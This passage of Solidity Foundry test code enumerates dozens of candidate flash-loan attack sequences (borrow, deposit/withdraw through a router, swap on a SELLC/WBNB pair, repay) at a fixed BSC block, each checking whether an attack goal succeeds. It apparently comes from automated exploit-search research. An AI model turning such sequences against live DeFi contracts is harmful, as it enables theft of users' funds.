        uint256 amt8
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt8 >= amt0);
        borrow_wbnb_owner(amt0);
        deposit_srouter_wbnb_sellc(amt1);
        withdraw_srouter_sellc_wbnb(amt2);
        deposit_srouter_wbnb_sellc(amt3);
        withdraw_srouter_sellc_wbnb(amt4);
        deposit_srouter_wbnb_sellc(amt5);
        swap_pair_attacker_sellc_wbnb(amt6, amt7);
        payback_wbnb_owner(amt8);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand114(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt7 >= amt0);
        borrow_wbnb_owner(amt0);
        deposit_srouter_wbnb_sellc(amt1);
        withdraw_srouter_sellc_wbnb(amt2);
        deposit_srouter_wbnb_sellc(amt3);
        withdraw_srouter_sellc_wbnb(amt4);
        deposit_srouter_wbnb_sellc(amt5);
        withdraw_srouter_sellc_wbnb(amt6);
        payback_wbnb_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand115(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_wbnb_owner(amt0);
        deposit_srouter_wbnb_sellc(amt1);
        withdraw_srouter_sellc_wbnb(amt2);
        deposit_srouter_wbnb_sellc(amt3);
        withdraw_srouter_sellc_wbnb(amt4);
        deposit_srouter_wbnb_sellc(amt5);
        withdraw_srouter_sellc_wbnb(amt6);
        swap_pair_attacker_sellc_wbnb(amt7, amt8);
        payback_wbnb_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand116(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt11 >= amt0);
        borrow_sellc_owner(amt0);
        swap_pair_attacker_sellc_wbnb(amt1, amt2);
        swap_pair_attacker_wbnb_sellc(amt3, amt4);
        swap_pair_attacker_sellc_wbnb(amt5, amt6);
        swap_pair_attacker_wbnb_sellc(amt7, amt8);
        withdraw_srouter_sellc_wbnb(amt9);
        deposit_srouter_wbnb_sellc(amt10);
        payback_sellc_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand117(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt11 >= amt0);
        borrow_sellc_owner(amt0);
        swap_pair_attacker_sellc_wbnb(amt1, amt2);
        swap_pair_attacker_wbnb_sellc(amt3, amt4);
        swap_pair_attacker_sellc_wbnb(amt5, amt6);
        deposit_srouter_wbnb_sellc(amt7);
        swap_pair_attacker_sellc_wbnb(amt8, amt9);
        deposit_srouter_wbnb_sellc(amt10);
        payback_sellc_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand118(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt11 >= amt0);
        borrow_sellc_owner(amt0);
        swap_pair_attacker_sellc_wbnb(amt1, amt2);
        swap_pair_attacker_wbnb_sellc(amt3, amt4);
        swap_pair_attacker_sellc_wbnb(amt5, amt6);
        deposit_srouter_wbnb_sellc(amt7);
        withdraw_srouter_sellc_wbnb(amt8);
        swap_pair_attacker_wbnb_sellc(amt9, amt10);
        payback_sellc_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand119(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_sellc_owner(amt0);
        swap_pair_attacker_sellc_wbnb(amt1, amt2);
        swap_pair_attacker_wbnb_sellc(amt3, amt4);
        swap_pair_attacker_sellc_wbnb(amt5, amt6);
        deposit_srouter_wbnb_sellc(amt7);
        withdraw_srouter_sellc_wbnb(amt8);
        deposit_srouter_wbnb_sellc(amt9);
        payback_sellc_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand120(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt11 >= amt0);
        borrow_sellc_owner(amt0);
        swap_pair_attacker_sellc_wbnb(amt1, amt2);
        swap_pair_attacker_wbnb_sellc(amt3, amt4);
        withdraw_srouter_sellc_wbnb(amt5);
        swap_pair_attacker_wbnb_sellc(amt6, amt7);
        swap_pair_attacker_sellc_wbnb(amt8, amt9);
        deposit_srouter_wbnb_sellc(amt10);
        payback_sellc_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand121(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt11 >= amt0);
        borrow_sellc_owner(amt0);
        swap_pair_attacker_sellc_wbnb(amt1, amt2);
        swap_pair_attacker_wbnb_sellc(amt3, amt4);
        withdraw_srouter_sellc_wbnb(amt5);
        swap_pair_attacker_wbnb_sellc(amt6, amt7);
        withdraw_srouter_sellc_wbnb(amt8);
        swap_pair_attacker_wbnb_sellc(amt9, amt10);
        payback_sellc_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand122(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_sellc_owner(amt0);
        swap_pair_attacker_sellc_wbnb(amt1, amt2);
        swap_pair_attacker_wbnb_sellc(amt3, amt4);
        withdraw_srouter_sellc_wbnb(amt5);
        swap_pair_attacker_wbnb_sellc(amt6, amt7);
        withdraw_srouter_sellc_wbnb(amt8);
        deposit_srouter_wbnb_sellc(amt9);
        payback_sellc_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand123(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt11 >= amt0);
        borrow_sellc_owner(amt0);
        swap_pair_attacker_sellc_wbnb(amt1, amt2);
        swap_pair_attacker_wbnb_sellc(amt3, amt4);
        withdraw_srouter_sellc_wbnb(amt5);
        deposit_srouter_wbnb_sellc(amt6);
        swap_pair_attacker_sellc_wbnb(amt7, amt8);
        swap_pair_attacker_wbnb_sellc(amt9, amt10);
        payback_sellc_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand124(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_sellc_owner(amt0);
        swap_pair_attacker_sellc_wbnb(amt1, amt2);
        swap_pair_attacker_wbnb_sellc(amt3, amt4);
        withdraw_srouter_sellc_wbnb(amt5);
        deposit_srouter_wbnb_sellc(amt6);
        swap_pair_attacker_sellc_wbnb(amt7, amt8);
        deposit_srouter_wbnb_sellc(amt9);
        payback_sellc_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand125(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_sellc_owner(amt0);
        swap_pair_attacker_sellc_wbnb(amt1, amt2);
        swap_pair_attacker_wbnb_sellc(amt3, amt4);
        withdraw_srouter_sellc_wbnb(amt5);
        deposit_srouter_wbnb_sellc(amt6);
        withdraw_srouter_sellc_wbnb(amt7);
        swap_pair_attacker_wbnb_sellc(amt8, amt9);
        payback_sellc_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand126(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_sellc_owner(amt0);
        swap_pair_attacker_sellc_wbnb(amt1, amt2);
        swap_pair_attacker_wbnb_sellc(amt3, amt4);
        withdraw_srouter_sellc_wbnb(amt5);
        deposit_srouter_wbnb_sellc(amt6);
        withdraw_srouter_sellc_wbnb(amt7);
        deposit_srouter_wbnb_sellc(amt8);
        payback_sellc_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand127(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt11 >= amt0);
        borrow_sellc_owner(amt0);
        swap_pair_attacker_sellc_wbnb(amt1, amt2);
        deposit_srouter_wbnb_sellc(amt3);
        swap_pair_attacker_sellc_wbnb(amt4, amt5);
        swap_pair_attacker_wbnb_sellc(amt6, amt7);
        swap_pair_attacker_sellc_wbnb(amt8, amt9);
        deposit_srouter_wbnb_sellc(amt10);
        payback_sellc_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand128(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt11 >= amt0);
        borrow_sellc_owner(amt0);
        swap_pair_attacker_sellc_wbnb(amt1, amt2);
        deposit_srouter_wbnb_sellc(amt3);
        swap_pair_attacker_sellc_wbnb(amt4, amt5);
        swap_pair_attacker_wbnb_sellc(amt6, amt7);
        withdraw_srouter_sellc_wbnb(amt8);
        swap_pair_attacker_wbnb_sellc(amt9, amt10);
        payback_sellc_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand129(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_sellc_owner(amt0);
        swap_pair_attacker_sellc_wbnb(amt1, amt2);
        deposit_srouter_wbnb_sellc(amt3);
        swap_pair_attacker_sellc_wbnb(amt4, amt5);
        swap_pair_attacker_wbnb_sellc(amt6, amt7);
        withdraw_srouter_sellc_wbnb(amt8);
        deposit_srouter_wbnb_sellc(amt9);
        payback_sellc_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand130(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt11 >= amt0);
        borrow_sellc_owner(amt0);
        swap_pair_attacker_sellc_wbnb(amt1, amt2);
        deposit_srouter_wbnb_sellc(amt3);
        swap_pair_attacker_sellc_wbnb(amt4, amt5);
        deposit_srouter_wbnb_sellc(amt6);
        swap_pair_attacker_sellc_wbnb(amt7, amt8);
        swap_pair_attacker_wbnb_sellc(amt9, amt10);
        payback_sellc_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand131(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_sellc_owner(amt0);
        swap_pair_attacker_sellc_wbnb(amt1, amt2);
        deposit_srouter_wbnb_sellc(amt3);
        swap_pair_attacker_sellc_wbnb(amt4, amt5);
        deposit_srouter_wbnb_sellc(amt6);
        swap_pair_attacker_sellc_wbnb(amt7, amt8);
        deposit_srouter_wbnb_sellc(amt9);
        payback_sellc_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand132(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_sellc_owner(amt0);
        swap_pair_attacker_sellc_wbnb(amt1, amt2);
        deposit_srouter_wbnb_sellc(amt3);
        swap_pair_attacker_sellc_wbnb(amt4, amt5);
        deposit_srouter_wbnb_sellc(amt6);
        withdraw_srouter_sellc_wbnb(amt7);
        swap_pair_attacker_wbnb_sellc(amt8, amt9);
        payback_sellc_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand133(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_sellc_owner(amt0);
        swap_pair_attacker_sellc_wbnb(amt1, amt2);
        deposit_srouter_wbnb_sellc(amt3);
        swap_pair_attacker_sellc_wbnb(amt4, amt5);
        deposit_srouter_wbnb_sellc(amt6);
        withdraw_srouter_sellc_wbnb(amt7);
        deposit_srouter_wbnb_sellc(amt8);
        payback_sellc_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand134(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt11 >= amt0);
        borrow_sellc_owner(amt0);
        swap_pair_attacker_sellc_wbnb(amt1, amt2);
        deposit_srouter_wbnb_sellc(amt3);
        swap_pair_attacker_sellc_wbnb(amt4, amt5);
        deposit_srouter_wbnb_sellc(amt6);
        withdraw_srouter_sellc_wbnb(amt7);
        deposit_srouter_wbnb_sellc(amt8);
        swap_pair_attacker_wbnb_sellc(amt9, amt10);
        payback_sellc_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand135(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt11 >= amt0);
        borrow_sellc_owner(amt0);
        swap_pair_attacker_sellc_wbnb(amt1, amt2);
        deposit_srouter_wbnb_sellc(amt3);
        withdraw_srouter_sellc_wbnb(amt4);
        swap_pair_attacker_wbnb_sellc(amt5, amt6);
        swap_pair_attacker_sellc_wbnb(amt7, amt8);
        swap_pair_attacker_wbnb_sellc(amt9, amt10);
        payback_sellc_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand136(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_sellc_owner(amt0);
        swap_pair_attacker_sellc_wbnb(amt1, amt2);
        deposit_srouter_wbnb_sellc(amt3);
        withdraw_srouter_sellc_wbnb(amt4);
        swap_pair_attacker_wbnb_sellc(amt5, amt6);
        swap_pair_attacker_sellc_wbnb(amt7, amt8);
        deposit_srouter_wbnb_sellc(amt9);
        payback_sellc_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand137(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_sellc_owner(amt0);
        swap_pair_attacker_sellc_wbnb(amt1, amt2);
        deposit_srouter_wbnb_sellc(amt3);
        withdraw_srouter_sellc_wbnb(amt4);
        swap_pair_attacker_wbnb_sellc(amt5, amt6);
        withdraw_srouter_sellc_wbnb(amt7);
        swap_pair_attacker_wbnb_sellc(amt8, amt9);
        payback_sellc_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand138(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_sellc_owner(amt0);
        swap_pair_attacker_sellc_wbnb(amt1, amt2);
        deposit_srouter_wbnb_sellc(amt3);
        withdraw_srouter_sellc_wbnb(amt4);
        swap_pair_attacker_wbnb_sellc(amt5, amt6);
        withdraw_srouter_sellc_wbnb(amt7);
        deposit_srouter_wbnb_sellc(amt8);
        payback_sellc_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand139(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_sellc_owner(amt0);
        swap_pair_attacker_sellc_wbnb(amt1, amt2);
        deposit_srouter_wbnb_sellc(amt3);
        withdraw_srouter_sellc_wbnb(amt4);
        deposit_srouter_wbnb_sellc(amt5);
        swap_pair_attacker_sellc_wbnb(amt6, amt7);
        swap_pair_attacker_wbnb_sellc(amt8, amt9);
        payback_sellc_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand140(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_sellc_owner(amt0);
        swap_pair_attacker_sellc_wbnb(amt1, amt2);
        deposit_srouter_wbnb_sellc(amt3);
        withdraw_srouter_sellc_wbnb(amt4);
        deposit_srouter_wbnb_sellc(amt5);
        swap_pair_attacker_sellc_wbnb(amt6, amt7);
        deposit_srouter_wbnb_sellc(amt8);
        payback_sellc_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand141(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt11 >= amt0);
        borrow_sellc_owner(amt0);
        swap_pair_attacker_sellc_wbnb(amt1, amt2);
        deposit_srouter_wbnb_sellc(amt3);
        withdraw_srouter_sellc_wbnb(amt4);
        deposit_srouter_wbnb_sellc(amt5);
        swap_pair_attacker_sellc_wbnb(amt6, amt7);
        deposit_srouter_wbnb_sellc(amt8);
        swap_pair_attacker_wbnb_sellc(amt9, amt10);
        payback_sellc_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand142(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_sellc_owner(amt0);
        swap_pair_attacker_sellc_wbnb(amt1, amt2);
        deposit_srouter_wbnb_sellc(amt3);
        withdraw_srouter_sellc_wbnb(amt4);
        deposit_srouter_wbnb_sellc(amt5);
        withdraw_srouter_sellc_wbnb(amt6);
        swap_pair_attacker_wbnb_sellc(amt7, amt8);
        payback_sellc_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand143(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt8 >= amt0);
        borrow_sellc_owner(amt0);
        swap_pair_attacker_sellc_wbnb(amt1, amt2);
        deposit_srouter_wbnb_sellc(amt3);
        withdraw_srouter_sellc_wbnb(amt4);
        deposit_srouter_wbnb_sellc(amt5);
        withdraw_srouter_sellc_wbnb(amt6);
        deposit_srouter_wbnb_sellc(amt7);
        payback_sellc_owner(amt8);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand144(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_sellc_owner(amt0);
        swap_pair_attacker_sellc_wbnb(amt1, amt2);
        deposit_srouter_wbnb_sellc(amt3);
        withdraw_srouter_sellc_wbnb(amt4);
        deposit_srouter_wbnb_sellc(amt5);
        withdraw_srouter_sellc_wbnb(amt6);
        deposit_srouter_wbnb_sellc(amt7);
        swap_pair_attacker_wbnb_sellc(amt8, amt9);
        payback_sellc_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand145(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt11 >= amt0);
        borrow_sellc_owner(amt0);
        withdraw_srouter_sellc_wbnb(amt1);
        swap_pair_attacker_wbnb_sellc(amt2, amt3);
        swap_pair_attacker_sellc_wbnb(amt4, amt5);
        swap_pair_attacker_wbnb_sellc(amt6, amt7);
        swap_pair_attacker_sellc_wbnb(amt8, amt9);
        deposit_srouter_wbnb_sellc(amt10);
        payback_sellc_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand146(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt11 >= amt0);
        borrow_sellc_owner(amt0);
        withdraw_srouter_sellc_wbnb(amt1);
        swap_pair_attacker_wbnb_sellc(amt2, amt3);
        swap_pair_attacker_sellc_wbnb(amt4, amt5);
        swap_pair_attacker_wbnb_sellc(amt6, amt7);
        withdraw_srouter_sellc_wbnb(amt8);
        swap_pair_attacker_wbnb_sellc(amt9, amt10);
        payback_sellc_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand147(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_sellc_owner(amt0);
        withdraw_srouter_sellc_wbnb(amt1);
        swap_pair_attacker_wbnb_sellc(amt2, amt3);
        swap_pair_attacker_sellc_wbnb(amt4, amt5);
        swap_pair_attacker_wbnb_sellc(amt6, amt7);
        withdraw_srouter_sellc_wbnb(amt8);
        deposit_srouter_wbnb_sellc(amt9);
        payback_sellc_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand148(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt11 >= amt0);
        borrow_sellc_owner(amt0);
        withdraw_srouter_sellc_wbnb(amt1);
        swap_pair_attacker_wbnb_sellc(amt2, amt3);
        swap_pair_attacker_sellc_wbnb(amt4, amt5);
        deposit_srouter_wbnb_sellc(amt6);
        swap_pair_attacker_sellc_wbnb(amt7, amt8);
        swap_pair_attacker_wbnb_sellc(amt9, amt10);
        payback_sellc_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand149(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_sellc_owner(amt0);
        withdraw_srouter_sellc_wbnb(amt1);
